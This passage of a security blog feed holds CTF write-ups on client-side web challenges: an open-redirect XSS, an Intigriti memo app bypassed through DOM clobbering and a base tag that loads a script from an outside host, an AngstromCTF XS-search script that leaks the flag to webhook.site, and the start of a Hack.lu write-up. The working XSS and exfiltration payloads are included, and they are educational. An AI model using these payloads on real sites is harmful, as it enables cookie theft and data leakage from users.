<p>With these steps, we can direct the fetch request to /contacts, which will <strong>trigger an Open Redirect to our attacker&rsquo;s server</strong>. The server responds with JSON containing a debug key with the XSS payload. This payload is then inserted into the outerHTML, leading to XSS.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>..%252F..%252F..%252Fcontact?return=https://attacker/exp.json%26e447f4e1-f7c9-439c-8378-b65b83189b60
</span></span></code></pre></div><p>On the attackerâ€™s server, we need to return a JSON object with the key debug and our XSS payload as the value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{ <span style="color:#ff79c6">&#34;debug&#34;</span>: <span style="color:#f1fa8c">&#34;&lt;img src=x onerror=alert()&gt;&#34;</span>} <span style="color:#6272a4">// for simple alert
</span></span></span></code></pre></div><h2 id="-exploit-">ðŸ’€ Exploit !!</h2>
<p><strong>Finally It works!!</strong></p>
<p><img src="https://hackmd.io/_uploads/BkxpOBjqR.png" alt="image"></p>
<p>To obtain the flag stored in the admin&rsquo;s cookie, we can simply access <strong>document.cookie</strong> within the XSS payload. Once we have the cookie, we can send it to our server and solve the challenge.</p>]]></description>
      
    </item>
    
    
    
    <item>
      <title>Intigriti 0724 XSS Challenge</title>
      <link>http://example.org/posts/intigriti-0724/</link>
      <pubDate>Thu, 06 Jun 2024 21:00:26 +0530</pubDate>
      
      <guid>http://example.org/posts/intigriti-0724/</guid>
      <description><![CDATA[<p><strong>tl;dr</strong></p>
<ul>
<li>Dom clobbering to clobber isDevelopmet</li>
<li>Throwing an error using RPO to prevent Dompurify from loading</li>
<li>Using base tag&rsquo;s to import our evil.js</li>
</ul>
<h2 id="-initial-analysis">ðŸ”Ž Initial analysis</h2>
<p>We are given a memo sharing application , and its seems like we html injection using the memo parameter. Looking at the client-side code for the application.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">integrity</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=&#34;</span>&gt;
</span></span><span style="display:flex;"><span>      <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;memoForm&#34;</span>).addEventListener(<span style="color:#f1fa8c">&#34;submit&#34;</span>, (event) =&gt; {
</span></span><span style="display:flex;"><span>        event.preventDefault();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> memoContent <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;memoContentInput&#34;</span>).value;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">window</span>.location.href <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">window</span>.location.href.split(<span style="color:#f1fa8c">&#34;?&#34;</span>)[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">?memo=</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">encodeURIComponent</span>(
</span></span><span style="display:flex;"><span>          memoContent
</span></span><span style="display:flex;"><span>        )<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>;
</span></span><span style="display:flex;"><span>      });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">const</span> urlParams <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> URLSearchParams(<span style="color:#8be9fd;font-style:italic">window</span>.location.search);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">const</span> sharedMemo <span style="color:#ff79c6">=</span> urlParams.get(<span style="color:#f1fa8c">&#34;memo&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (sharedMemo) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> displayElement <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;displayMemo&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//Don&#39;t worry about XSS, the CSP will protect us for now
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        displayElement.innerHTML <span style="color:#ff79c6">=</span> sharedMemo;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (origin <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;http://localhost&#34;</span>) isDevelopment <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (isDevelopment) {
</span></span><span style="display:flex;"><span>          <span style="color:#6272a4">//Testing XSS sanitization for next release
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>          <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
</span></span><span style="display:flex;"><span>            displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
</span></span><span style="display:flex;"><span>          } <span style="color:#ff79c6">catch</span> (error) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> loggerScript <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;script&#34;</span>);
</span></span><span style="display:flex;"><span>            loggerScript.src <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./logger.js&#34;</span>;
</span></span><span style="display:flex;"><span>            loggerScript.onload <span style="color:#ff79c6">=</span> () =&gt; logError(error);
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(loggerScript);
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#ff79c6">script</span>&gt;
</span></span></code></pre></div><p>as you can see our input HTML goes into an innerHTML sink in the beginning itself, however there is no easy XSS as there is a CSP.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">default</span><span style="color:#ff79c6">-</span>src <span style="color:#ff79c6">*</span>; script<span style="color:#ff79c6">-</span>src <span style="color:#f1fa8c">&#39;strict-dynamic&#39;</span> <span style="color:#f1fa8c">&#39;sha256-bSjVkAbbcTI28KD1mUfs4dpQxuQ+V4WWUvdQWCI4iXw=&#39;</span> <span style="color:#f1fa8c">&#39;sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=&#39;</span>;
</span></span></code></pre></div><p>The csp doesnt seem too strict , the first thing that i thought of was that default src is * and there is no base uri directive in the csp .</p>
<p>So we can inject a base tag with our server as the href value which will make all the scripts with relative paths in the page load resources from our server.</p>
<p>However there is only one script being used in the page which is  dompurify.js and it is being loaded way before our injection happens so we cant make it load from our server using base tags.</p>
<p>However there is another script (logger.js) that is being loaded dynamically if certain conditions are satisfied. We can control the location from where logger.js is loaded using base tags as it is being loaded after our injection happens .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (origin <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;http://localhost&#34;</span>) isDevelopment <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (isDevelopment) {
</span></span><span style="display:flex;"><span>          <span style="color:#6272a4">//Testing XSS sanitization for next release
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>          <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
</span></span><span style="display:flex;"><span>            displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
</span></span><span style="display:flex;"><span>          } <span style="color:#ff79c6">catch</span> (error) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> loggerScript <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;script&#34;</span>);
</span></span><span style="display:flex;"><span>            loggerScript.src <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./logger.js&#34;</span>;
</span></span><span style="display:flex;"><span>            loggerScript.onload <span style="color:#ff79c6">=</span> () =&gt; logError(error);
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(loggerScript);
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span></code></pre></div><p>So to make logger.js load from our external server we have somehow reach the catch block. So for that to happen we need isDevelopment to be true, so that we can get inside the if block.</p>
<p>isDeveloment is only set to true if the origin is localhost.At the first glance it seems impossible to set isDevelopment as true.</p>
<p>However there are certain stuff you could to with just HTML injection!!</p>
<h2 id="-attack-plan">ðŸ¥· Attack plan</h2>
<p>So the attack plan is to use DOM clobbering here as we have HTML injection to define the isDevelopment variable. As isDevelopment is a global variable a simple tag with id attribute as isDevelopment will define that variable. Eg</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>a id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isDevelopment&#34;</span><span style="color:#ff79c6">&gt;</span>,<span style="color:#ff79c6">&lt;</span>div id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isdevelopment&#34;</span><span style="color:#ff79c6">&gt;</span> etc 
</span></span></code></pre></div><h2 id="causing-an-error-to-reach-the-catch-block-">Causing an Error to reach the catch block ðŸŒŸ</h2>
<p>So now we are inside the if block , and to get to our logger.js script to load we have to get to the catch block . For that we have to cause an error somehow in these lines of code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
</span></span><span style="display:flex;"><span>    displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If you look at the source code closely you can see that Dompurify is being loaded as a relative path. so if we access the page like /index.html/blah dompurify will try to get loaded from /blah .</p>
<p>So now that we are in the catch block we can use a base tag to load logger.js from our server.</p>
<h2 id="--final-payloads">ðŸš€  Final Payloads</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isDevelopment&#34;</span>&gt;asdf&lt;/<span style="color:#ff79c6">a</span>&gt;&lt;<span style="color:#ff79c6">base</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://alfino.free.beeceptor.com/&#34;</span>&gt;
</span></span></code></pre></div><p>where we host logger.js at <a href="https://alfino.free.beeceptor.com/logger.js">https://alfino.free.beeceptor.com/logger.js</a></p>]]></description>
      
    </item>
    
    
    
    <item>
      <title>WaterMark as a Service AngstromCTF</title>
      <link>http://example.org/posts/angstrom/</link>
      <pubDate>Sun, 26 May 2024 21:01:42 +0530</pubDate>
      
      <guid>http://example.org/posts/angstrom/</guid>
      <description><![CDATA[<p><strong>tl;dr</strong></p>
<ul>
<li>XS-search 200 / 404 .</li>
<li>Leaking using HTML injection in a same-site challenge.</li>
<li>Link tags and Error events .</li>
</ul>
<h2 id="-initial-analysis">ðŸ”Ž Initial analysis</h2>
<p>We are given the application source code and a challenge link. Also, there is a <code>waaas.js</code> for the admin bot. Looking at the application, the main functionality was the search endpoint.</p>
<p>Taking a look at the code for /search endpoint in the <code>index.js</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>app.get(<span style="color:#f1fa8c">&#39;/search&#39;</span>, (req, res) =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (req.cookies[<span style="color:#f1fa8c">&#39;admin_cookie&#39;</span>] <span style="color:#ff79c6">!==</span> secretvalue) {
</span></span><span style="display:flex;"><span>		res.status(<span style="color:#bd93f9">403</span>).send(<span style="color:#f1fa8c">&#34;Unauthorized&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">let</span> query <span style="color:#ff79c6">=</span> req.query.q;
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">let</span> flag <span style="color:#ff79c6">of</span> flags) {
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> (flag.indexOf(query) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
</span></span><span style="display:flex;"><span>				res.status(<span style="color:#bd93f9">200</span>).send(<span style="color:#f1fa8c">&#34;Found&#34;</span>);
</span></span><span style="display:flex;"><span>				<span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		res.status(<span style="color:#bd93f9">404</span>).send(<span style="color:#f1fa8c">&#34;Not Found&#34;</span>);
</span></span><span style="display:flex;"><span>	} <span style="color:#ff79c6">catch</span> (e) {
</span></span><span style="display:flex;"><span>		console.log(e);
</span></span><span style="display:flex;"><span>		res.sendStatus(<span style="color:#bd93f9">500</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>It was basically checking if our input query was a substring of the flag. But we cannot send requests to /search due to the check in the start, which checks whether or not the request is from the admin user. So our requests would get 403 Unauthorized as the response.</p>
<h2 id="-attack-plan">ðŸ¥· Attack plan</h2>
<p>Since we cant directly access the /search enpoint we have to somehow make the admin send those requests. One approach is to get XSS anywhere in the site so we can send fetch requests bruteforce the flag. But unfortunately there is no XSS in this site.</p>
<p>The Next approach would be an <strong>XS-Search</strong> attack to leak the flag . As the bot is visiting any url we give it. In the /search enpoint if the query is a valid substring of the flag it was returning <strong>200 Found</strong> and if its not a valid substring it was returning <strong>404 Not Found</strong>.</p>
<p>We can use <a href="https://https://xsleaks.dev/docs/attacks/error-events/">Error Events</a> to differntiate between these 2 status codes cross site .</p>
<p>But there is another issue . . . . . <strong>Same Site Cookies!!</strong> . Looking the admin bots source code we can see that the admin cookie is <strong>same-site Lax</strong> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> cookie <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>                domain<span style="color:#ff79c6">:</span> domain,
</span></span><span style="display:flex;"><span>                name<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;admin_cookie&#34;</span>,
</span></span><span style="display:flex;"><span>                value<span style="color:#ff79c6">:</span> key,
</span></span><span style="display:flex;"><span>                httpOnly<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
</span></span><span style="display:flex;"><span>                secure<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
</span></span><span style="display:flex;"><span>                sameSite<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;Lax&#39;</span>
</span></span><span style="display:flex;"><span>    };
</span></span></code></pre></div><p>So the cookies won&rsquo;t be sent on the  requests which are sent from our hosted exploit as it wont be same-site ðŸ˜“.</p>
<h2 id="samesite-leaks-ftw--">SameSite Leaks ftw  ðŸŒŸ</h2>
<p>If we have XSS or HTML injection in any domain which is same-site to the challenge domain we can use that in our favour for <a href="https://https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks">Same Site Leaks</a>.</p>
<p>The challenge was hosted on <code>https://wwwwwwwwaas.web.actf.co/</code> and all other challenges was were subdomains of <code>web.actf.co</code> and fortunately we had XSS on <code>markdown.web.actf.co</code> which is <strong>same-site</strong>.</p>
<p>So now we can host our exploit to leak the flag on <code>markdown.web.actf.co</code> .</p>
<h2 id="-final-payloads">ðŸš€ Final Payloads</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> charset <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;abcdef1234567890{}ghijklmnopqrstuvwxyz_&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> found <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;actf&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> leak_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5&#34;</span>   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> next <span style="color:#ff79c6">=</span> (i) =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">char</span> <span style="color:#ff79c6">=</span> charset[i]
</span></span><span style="display:flex;"><span>      link <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;link&#34;</span>)
</span></span><span style="display:flex;"><span>      link.rel <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;stylesheet&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(link)            
</span></span><span style="display:flex;"><span>      link.onload <span style="color:#ff79c6">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>           found <span style="color:#ff79c6">+=</span> charset[i]
</span></span><span style="display:flex;"><span>           navigator.sendBeacon(leak_url,JSON.stringify({type<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;success&#34;</span>, found<span style="color:#ff79c6">:</span>found,<span style="color:#ff79c6">char</span><span style="color:#ff79c6">:</span>charset[i] }))
</span></span><span style="display:flex;"><span>           next(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       link.onerror <span style="color:#ff79c6">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>           next(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>       link.href <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://wwwwwwwwaas.web.actf.co/search?q=&#34;</span><span style="color:#ff79c6">+</span>found<span style="color:#ff79c6">+</span>charset[i]
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>next(<span style="color:#bd93f9">0</span>)
</span></span></code></pre></div><h2 id="-flag">ðŸš© Flag</h2>
<p><code>actf{the_w_watermarks_the_whereabouts}</code></p>]]></description>
      
    </item>
    
    
    
    <item>
      <title>pÃ¤Ã¤Ã¤d - Hack.lu CTF 2023 </title>
      <link>http://example.org/posts/hacklu/</link>
      <pubDate>Sun, 26 May 2024 13:07:55 +0530</pubDate>
      
      <guid>http://example.org/posts/hacklu/</guid>
      <description><![CDATA[<p><strong>tl;dr</strong></p>
<ul>
<li>meta redirect to attacker website, using the html injection in the paaad.</li>
<li>leak the unique subdomain with csp violation.</li>
<li>Another meta redirect csrf with the leaked subdomain to make the note public.</li>
</ul>
<p><strong>No. of solves</strong>: 5</p>
<h2 id="-initial-analysis">ðŸ”Ž Initial analysis</h2>
<p>We are given the application source code and a challenge link. Also there is a <code>bot.js</code> for the admin bot. So it was some client side challenge. Looking at the application,  its main functionality was to create pads (basically notes ) and view them. There was html and markdown allowed in the contents of the pad.</p>
<p>Looking at the <code>bot.js</code> file .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> browser.newPage();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// login 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/user/login`</span>, { waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }); <span style="color:#6272a4">// wait until page load
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// generate admin creds
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#username&#39;</span>, ADMIN_USERNAME);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#password&#39;</span>, ADMIN_PASSWORD);
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// click and wait for navigation
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> <span style="color:#8be9fd;font-style:italic">Promise</span>.all([
</span></span><span style="display:flex;"><span>        page.click(<span style="color:#f1fa8c">&#39;#submit&#39;</span>),
</span></span><span style="display:flex;"><span>        page.waitForNavigation({ waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }),
</span></span><span style="display:flex;"><span>    ]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// create flag pad
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/p/new`</span>, { waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }); <span style="color:#6272a4">// wait until page load
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#title&#39;</span>, <span style="color:#f1fa8c">&#39;flag&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> page.type(<span style="color:#f1fa8c">&#39;#content&#39;</span>, FLAG);
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// click and wait for navigation
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> <span style="color:#8be9fd;font-style:italic">Promise</span>.all([
</span></span><span style="display:flex;"><span>        page.click(<span style="color:#f1fa8c">&#39;#submit&#39;</span>),
</span></span><span style="display:flex;"><span>        page.waitForNavigation({ waitUntil<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;networkidle0&#39;</span> }),
</span></span><span style="display:flex;"><span>    ])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// avoid leaking anything
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">await</span> page.close();
</span></span><span style="display:flex;"><span>    page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">await</span> browser.newPage();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    page.on(<span style="color:#f1fa8c">&#39;console&#39;</span>, (msg) =&gt; {
</span></span><span style="display:flex;"><span>        console.log(<span style="color:#f1fa8c">&#39;[Console]&#39;</span>, msg);
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// open the link
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    console.log(<span style="color:#f1fa8c">`Visiting URL: https://</span><span style="color:#f1fa8c">${</span>padid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> `</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">await</span> page.<span style="color:#ff79c6">goto</span>(<span style="color:#f1fa8c">`https://</span><span style="color:#f1fa8c">${</span>padid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">${</span>DOMAIN<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>);
</span></span></code></pre></div><p>After looking at <code>bot.js</code> it&rsquo;s clear that the flag is in the admins pad. So we have to somehow steal the contents of the admins pad using XSS or using some other client side attack. But unfortunately, the content inside the pad is sanitized using the HTML Sanitizer API . So there is no chance for direct XSS to steal the admins pad.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> markdown <span style="color:#ff79c6">=</span> (md) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> md.replace(/__(.*?)__/gs, &#39;&lt;strong&gt;$1&lt;/strong&gt;&#39;)
</span></span><span style="display:flex;"><span>            .replace(/_(.*?)_/gs, &#39;&lt;em&gt;$1&lt;/em&gt;&#39;)
</span></span><span style="display:flex;"><span>            .replace(/## (.*?)\n/gs, &#39;&lt;h2&gt;$1&lt;/h2&gt;&#39;)
</span></span><span style="display:flex;"><span>            .replace(/# (.*?)\n/gs, &#39;&lt;h1&gt;$1&lt;/h1&gt;&#39;)
</span></span><span style="display:flex;"><span>            .replace(/!\[(.*?)\]\((.*?)\)/gs, &#39;&lt;img alt=&#34;$1&#34; src=&#34;$2&#34; /&gt;&#39;)
</span></span><span style="display:flex;"><span>            .replace(/\[(.*?)\]\((.*?)\)/gs, &#39;&lt;a href=&#34;$2&#34;&gt;$1&lt;/a&gt;&#39;)
</span></span><span style="display:flex;"><span>            .replace(/`(.*?)`/gs, &#39;&lt;code&gt;$1&lt;/code&gt;&#39;)
</span></span><span style="display:flex;"><span>            .replace(/\n/gs, &#39;&lt;br&gt;&#39;)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> md <span style="color:#ff79c6">=</span> markdown(padcontent.dataset.content)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> sanitizer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Sanitizer()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    padcontent.setHTML(md, { sanitizer })
</span></span></code></pre></div><p>Looking at the code to create pads at the <code>/p/new</code> endpoint. We can see that there is a cookie called latest being set with a unique_id.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>router.post(<span style="color:#f1fa8c">&#39;/p/new&#39;</span>, ensureAuthenticated, <span style="color:#ff79c6">async</span> (req, res) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> {title, content, isPublic, isTemp} <span style="color:#ff79c6">=</span> req.body
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">let</span> pad <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Pad({
</span></span><span style="display:flex;"><span>        username<span style="color:#ff79c6">:</span> req.session.username,
</span></span><span style="display:flex;"><span>        title,
</span></span><span style="display:flex;"><span>        content,
